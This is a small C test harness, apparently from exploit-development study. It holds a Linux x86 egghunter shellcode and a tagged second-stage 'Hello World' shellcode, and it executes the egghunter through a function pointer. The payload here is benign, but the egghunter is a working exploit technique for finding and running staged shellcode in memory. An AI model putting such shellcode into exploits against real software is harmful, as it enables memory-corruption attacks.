#include <stdio.h>
#include <string.h>

// egg (8b8b8b8b) + "Hello World" shellcode
unsigned char stage2[] = "\x8b\x8b\x8b\x8b\xeb\x17\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x59\x31\xd2\xb2\x0d\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0a";

// egghunter
unsigned char code[] = "\xba\x8a\x8b\x8b\x8b\x42\x31\xdb\x66\x81\xcb\xff\x0f\x43\x6a\x0c\x58\xcd\x80\x3c\xf2\x74\xf1\x39\x13\x75\xf2\x8d\x43\x04\xff\xe0";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));
	printf("Second Stage Length: %d\n", strlen(stage2));

	int (*ret)() = (int(*)())code;

	ret();

}

	
